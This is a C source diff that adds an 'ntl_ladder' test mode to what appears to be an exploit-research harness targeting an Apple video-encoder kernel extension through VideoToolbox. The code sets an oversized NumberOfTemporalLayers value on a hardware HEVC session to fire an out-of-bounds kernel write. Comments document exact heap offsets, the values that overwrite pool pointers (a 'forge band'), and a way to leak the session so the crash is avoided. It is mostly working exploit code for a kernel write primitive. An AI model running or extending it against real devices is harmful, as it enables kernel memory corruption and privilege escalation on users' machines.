@@ -11649,6 +11649,119 @@ vps_cd_done:
 
         rlog("\n=== NTL_NAL_SCAN complete: tested %d values ===\n", tested);
 
+    } else if (strcmp(mode, "ntl_ladder") == 0) {
+        /*
+         * ntl_ladder — Test ONE NTL value from the panicIDK ladder
+         *
+         * Based on the proven kernel-write primitive analysis:
+         * - pClient size = 0x147c8  (kext 913.43.1)
+         * - pool[0] at pClient+0x147b0
+         * - Loop 1 base: pClient+0x4678, count = NTL-1
+         * - NTL=16463: last slot before pool[0]
+         * - NTL=16464: partial write into pool[0] -> crash at teardown
+         * - NTL=16465+: full forge band
+         *
+         * Tests SINGLE value safely: set NTL, prepare (OOB write fires here),
+         * try encode, then SKIP teardown if NTL >= crash_threshold.
+         *
+         * Usage: ntl_ladder <ntl_value> [skip_teardown=0]
+         *   skip_teardown=1: leak the session (no VTCompressionSessionInvalidate)
+         *                    to avoid the crash at teardown. The write still fires
+         *                    during PrepareToEncodeFrames.
+         */
+        if (argc < 3) {
+            rlog("Usage: ntl_ladder <ntl_value> [skip_teardown=0]\n");
+            rlog("  ntl_value: the NTL to test (e.g. 16460, 16463, 16464)\n");
+            rlog("  skip_teardown=1: skip session invalidation (avoids crash)\n");
+            goto done;
+        }
+        int ntl = atoi(argv[2]);
+        int skip_td = (argc > 3) ? atoi(argv[3]) : 0;
+        int vw = 192, vh = 192;
+
+        rlog("=== NTL_LADDER: Surgical write primitive test ===\n");
+        rlog("NTL=%d, skip_teardown=%d, res=%dx%d\n", ntl, skip_td, vw, vh);
+        rlog("Expected: NTL<=16463 clean, NTL=16464 pool[0] hit, NTL>=16465 full forge\n");
+        rlog("Loop1 offset: pClient+0x4678 + (%d-1)*4 = pClient+0x%lx\n",
+             ntl, (unsigned long)(0x4678 + ((unsigned long)(ntl - 1)) * 4));
+        rlog("Pool[0] at pClient+0x147b0, Pool[1] at +0x147b8, Pool[2] at +0x147c0\n\n");
+
+        VTCompressionSessionRef s = NULL;
+        CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+        CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+        OSStatus cs = VTCompressionSessionCreate(NULL, vw, vh,
+            kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
+        CFRelease(es);
+        rlog("Create: %d\n", (int)cs);
+        if (cs != noErr || !s) { rlog("FAIL: could not create session\n"); goto done; }
+
+        VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+        CFNumberRef ntl_num = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
+        OSStatus sp = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), ntl_num);
+        CFRelease(ntl_num);
+        rlog("SetProp NTL=%d: %d\n", ntl, (int)sp);
+        if (sp != noErr) {
+            rlog("REJECTED — NTL not accepted (fix applied?)\n");
+            VTCompressionSessionInvalidate(s); CFRelease(s);
+            goto done;
+        }
+
+        rlog("Calling PrepareToEncodeFrames (OOB write fires here)...\n");
+        struct timeval prep_start, prep_end;
+        gettimeofday(&prep_start, NULL);
+        OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
+        gettimeofday(&prep_end, NULL);
+        long prep_ms = (prep_end.tv_sec - prep_start.tv_sec) * 1000 +
+                       (prep_end.tv_usec - prep_start.tv_usec) / 1000;
+        rlog("Prepare: %d (took %ldms)\n", (int)prep, prep_ms);
+        if (prep != noErr) {
+            rlog("Prepare FAILED\n");
+            VTCompressionSessionInvalidate(s); CFRelease(s);
+            goto done;
+        }
+
+        rlog("OOB write loop has executed. Testing encode...\n");
+        g_encode_done = 0; g_cb_status = -999; g_last_nal_size = 0;
+        CVPixelBufferRef pb = NULL;
+        CVPixelBufferCreate(NULL, vw, vh, kCVPixelFormatType_32BGRA, NULL, &pb);
+        if (pb) {
+            CVPixelBufferLockBaseAddress(pb, 0);
+            void *base = CVPixelBufferGetBaseAddress(pb);
+            if (base) memset(base, 0x42, CVPixelBufferGetDataSize(pb));
+            CVPixelBufferUnlockBaseAddress(pb, 0);
+
+            struct timeval enc_start, enc_end;
+            gettimeofday(&enc_start, NULL);
+            OSStatus enc = VTCompressionSessionEncodeFrame(s, pb,
+                CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+            if (enc == noErr) {
+                VTCompressionSessionCompleteFrames(s, kCMTimePositiveInfinity);
+                for (int w = 0; w < 300 && !g_encode_done; w++) usleep(10000);
+            }
+            gettimeofday(&enc_end, NULL);
+            long enc_ms = (enc_end.tv_sec - enc_start.tv_sec) * 1000 +
+                          (enc_end.tv_usec - enc_start.tv_usec) / 1000;
+            CVPixelBufferRelease(pb);
+            rlog("Encode: status=%d cb=%d nal=%zu done=%d ms=%ld\n",
+                 (int)enc, (int)g_cb_status, g_last_nal_size, g_encode_done, enc_ms);
+        } else {
+            rlog("PixelBuffer creation failed\n");
+        }
+
+        if (skip_td) {
+            rlog("SKIPPING TEARDOWN (session leaked to avoid crash)\n");
+            rlog("The OOB write has already fired during Prepare.\n");
+            rlog("Pool pointers may be corrupted but won't be deref'd.\n");
+        } else {
+            rlog("Tearing down session (pool pointers will be deref'd)...\n");
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+            rlog("Teardown OK — no crash (pool was clean or not deref'd)\n");
+        }
+        rlog("\n=== NTL_LADDER complete ===\n");
+
     } else if (strcmp(mode, "ntl_hang_search") == 0) {
         /*
          * ntl_hang_search — Binary search the encode-hang boundary
